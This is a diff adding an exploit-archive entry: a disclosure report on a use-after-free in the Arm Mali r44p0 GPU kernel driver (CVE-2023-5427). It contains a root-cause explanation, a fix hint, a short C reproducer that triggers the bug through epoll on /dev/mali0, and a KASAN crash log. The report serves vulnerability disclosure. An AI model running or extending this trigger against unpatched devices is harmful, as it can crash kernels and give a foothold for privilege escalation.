@@ -1,0 +1,174 @@
+id: 39178
+date: 12/04/2023
+title: ARM Mali r44p0 Use-After-Free Exploit
+author: Jann Horn
+cves: CVE-2023-5427
+
+Arm Mali r44p0: UAF by freeing waitqueue with elements on it
+
+In Mali r44p0, it became possible to free the kbase_context of a kbase_file while still having a file pointing to the kbase_file. This is supposed to be safe because of the kfile->fops_count and kfile->map_count checks.
+
+However, kbase_poll() will connect the kctx->event_queue wait queue to the caller's wait table, and kctx teardown doesn't remove those connections before freeing the kctx. So if you set up such a connection, then free the kctx, there will be dangling pointers left in the wait table, leading to UAF when the wait table is torn down. Tested on x86-64 with MALI_NO_MALI in a non-CSF configuration, with KASAN enabled including CONFIG_KASAN_VMALLOC=y.
+
+For a way to fix this, if you want to keep the design where the waitqueue is stored inside the kctx and the kctx can be freed while the corresponding file is still referenced by userspace, see wake_up_pollfree() (and the comment above it describing when it's safe to use).
+
+Reproducer:
+
+#define _GNU_SOURCE
+#include <pthread.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <stdbool.h>
+#include <err.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <assert.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <ctype.h>
+#include <sys/syscall.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <sys/wait.h>
+#include <sys/epoll.h>
+
+#define SYSCHK(x) ({          \\
+  typeof(x) __res = (x);      \\
+  if (__res == (typeof(x))-1) \\
+    err(1, \"SYSCHK(\" #x \")\"); \\
+  __res;                      \\
+})
+
+#define KBASE_IOCTL_TYPE 0x80
+
+#define __u8  uint8_t
+#define __u16 uint16_t
+#define __u32 uint32_t
+#define __u64 uint64_t
+
+struct kbase_ioctl_version_check {
+        __u16 major;
+        __u16 minor;
+};
+#define KBASE_IOCTL_VERSION_CHECK \\
+        _IOWR(KBASE_IOCTL_TYPE, /*52*/0, struct kbase_ioctl_version_check)
+
+struct kbase_ioctl_set_flags {
+        __u32 create_flags;
+};
+#define KBASE_IOCTL_SET_FLAGS \\
+        _IOW(KBASE_IOCTL_TYPE, 1, struct kbase_ioctl_set_flags)
+
+static int setup_mali(void) {
+  int mali_fd = SYSCHK(open(\"/dev/mali0\", O_RDWR));
+  struct kbase_ioctl_version_check vc = { .major = 11, .minor = 11 };
+  SYSCHK(ioctl(mali_fd, KBASE_IOCTL_VERSION_CHECK, &vc));
+  struct kbase_ioctl_set_flags set_flags = { .create_flags = 0 };
+  SYSCHK(ioctl(mali_fd, KBASE_IOCTL_SET_FLAGS, &set_flags));
+  return mali_fd;
+}
+
+int main(void) {
+  int mali_fd = setup_mali();
+  int epoll = SYSCHK(epoll_create1(0));
+  struct epoll_event ev = { .events = EPOLLIN, .data.u64 = 0 };
+  SYSCHK(epoll_ctl(epoll, EPOLL_CTL_ADD, mali_fd, &ev));
+  SYSCHK(close(SYSCHK(dup(mali_fd))));
+  SYSCHK(close(epoll));
+}
+
+
+Splat (it claims it's a vmalloc-out-of-bounds issue but that's because KASAN doesn't have logic to distinguish between vmalloc bug types, I'm fairly sure it's actually a UAF):
+
+[  749.960381] ==================================================================
+[  749.973731] BUG: KASAN: vmalloc-out-of-bounds in _raw_spin_lock_irqsave+0x71/0xe0
+[  749.977062] Write of size 4 at addr ffffc90000fb0e60 by task mali-poll-uaf/592
+[  749.979664]
+[  749.980272] CPU: 0 PID: 592 Comm: mali-poll-uaf Not tainted 5.15.124-dirty #7
+[  750.006285] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
+[  750.011611] Call Trace:
+[  750.012401]  <TASK>
+[  750.013034]  dump_stack_lvl+0x33/0x46
+[  750.014088]  print_address_description.constprop.0+0x1f/0x1e0
+[...]
+[  750.018760]  kasan_report.cold+0x7f/0x10a
+[...]
+[  750.021985]  kasan_check_range+0x15b/0x1c0
+[  750.023603]  _raw_spin_lock_irqsave+0x71/0xe0
+[...]
+[  750.029885]  remove_wait_queue+0x18/0x80
+[  750.031303]  ep_unregister_pollwait.constprop.0+0x46/0x80
+[  750.032801]  ep_free+0x65/0xf0
+[  750.033761]  ep_eventpoll_release+0x26/0x30
+[  750.036727]  __fput+0x109/0x420
+[  750.037647]  task_work_run+0x91/0xd0
+[  750.038680]  exit_to_user_mode_prepare+0x13c/0x140
+[  750.040013]  syscall_exit_to_user_mode+0x1d/0x40
+[  750.041449]  do_syscall_64+0x46/0x90
+[  750.042484]  entry_SYSCALL_64_after_hwframe+0x61/0xcb
+[  750.044221] RIP: 0033:0x7f48b3e83b54
+[  750.045254] Code: eb 8d e8 7f fc 01 00 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 44 00 00 48 8d 05 a9 5b 0d 00 8b 00 85 c0 75 13 b8 03 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 3c c3 0f 1f 00 53 89 fb 48 83 ec 10 e8 e4 bb
+[  750.050358] RSP: 002b:00007ffef4fedaf8 EFLAGS: 00000246 ORIG_RAX: 0000000000000003
+[  750.053231] RAX: 0000000000000000 RBX: 0000000000000000 RCX: 00007f48b3e83b54
+[  750.057280] RDX: 0000000000000003 RSI: 0000000000000001 RDI: 0000000000000004
+[  750.060571] RBP: 00007ffef4fedb30 R08: 00007f48b3f55d80 R09: 00007f48b3f55d80
+[  750.063571] R10: fffffffffffff4ee R11: 0000000000000246 R12: 0000562bb7eaa0b0
+[  750.065782] R13: 00007ffef4fedc10 R14: 0000000000000000 R15: 0000000000000000
+[  750.070671]  </TASK>
+[  750.071563]
+[  750.071995]
+[  750.072416] Memory state around the buggy address:
+[  750.074020]  ffffc90000fb0d00: f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8
+[  750.076029]  ffffc90000fb0d80: f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8
+[  750.077980] >ffffc90000fb0e00: f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8
+[  750.080084]                                                        ^
+[  750.081919]  ffffc90000fb0e80: f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8
+[  750.084033]  ffffc90000fb0f00: f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8 f8
+[  750.086379] ==================================================================
+[  750.088654] Disabling lock debugging due to kernel taint
+[  750.090569] BUG: unable to handle page fault for address: ffffc90000fb0e60
+[  750.092916] #PF: supervisor write access in kernel mode
+[  750.094760] #PF: error_code(0x0002) - not-present page
+[  750.096660] PGD 1000067 P4D 1000067 PUD 11ec067 PMD 8e6c067 PTE 0
+[  750.101539] Oops: 0002 [#1] SMP KASAN
+[  750.102816] CPU: 0 PID: 592 Comm: mali-poll-uaf Tainted: G    B             5.15.124-dirty #7
+[  750.105360] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
+[  750.108347] RIP: 0010:_raw_spin_lock_irqsave+0x89/0xe0
+[  750.109866] Code: be 04 00 00 00 c7 44 24 20 00 00 00 00 e8 2f 27 e1 fe be 04 00 00 00 48 8d 7c 24 20 e8 20 27 e1 fe ba 01 00 00 00 8b 44 24 20 <f0> 0f b1 13 75 33 48 b8 00 00 00 00 00 fc ff df 48 c7 44 05 00 00
+[  750.115121] RSP: 0018:ffffc900009cfd70 EFLAGS: 00010097
+[  750.116794] RAX: 0000000000000000 RBX: ffffc90000fb0e60 RCX: ffffffffbaf4fa50
+[  750.119073] RDX: 0000000000000001 RSI: 0000000000000004 RDI: ffffc900009cfd90
+[  750.121579] RBP: 1ffff92000139fae R08: 0000000000000001 R09: 0000000000000003
+[  750.124582] R10: fffff52000139fb2 R11: 6e696c6261736944 R12: 0000000000000246
+[  750.127169] R13: 0000000000000000 R14: ffff8880038a31a8 R15: ffffffffbb4ca980
+[  750.129991] FS:  00007f48b3f5b540(0000) GS:ffff88806d400000(0000) knlGS:0000000000000000
+[  750.137456] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  750.139807] CR2: ffffc90000fb0e60 CR3: 000000001bf15001 CR4: 0000000000370ef0
+[  750.142776] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
+[  750.145450] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
+[  750.148291] Call Trace:
+[  750.149227]  <TASK>
+[...]
+[  750.175815]  remove_wait_queue+0x18/0x80
+[  750.177246]  ep_unregister_pollwait.constprop.0+0x46/0x80
+[  750.179212]  ep_free+0x65/0xf0
+[  750.180376]  ep_eventpoll_release+0x26/0x30
+[  750.181917]  __fput+0x109/0x420
+[  750.183156]  task_work_run+0x91/0xd0
+[  750.184480]  exit_to_user_mode_prepare+0x13c/0x140
+[  750.186273]  syscall_exit_to_user_mode+0x1d/0x40
+[  750.188108]  do_syscall_64+0x46/0x90
+[  750.189490]  entry_SYSCALL_64_after_hwframe+0x61/0xcb
+[...]
+
+
+This bug is subject to a 90-day disclosure deadline. If a fix for this
+issue is made available to users before the end of the 90-day deadline,
+this bug report will become public 30 days after the fix was made
+available. Otherwise, this bug report will become public at the deadline.
+The scheduled deadline is 2023-11-22.
+
+Related CVE Numbers: CVE-2023-5427.
+
+#  0day.today [2023-12-10]  #
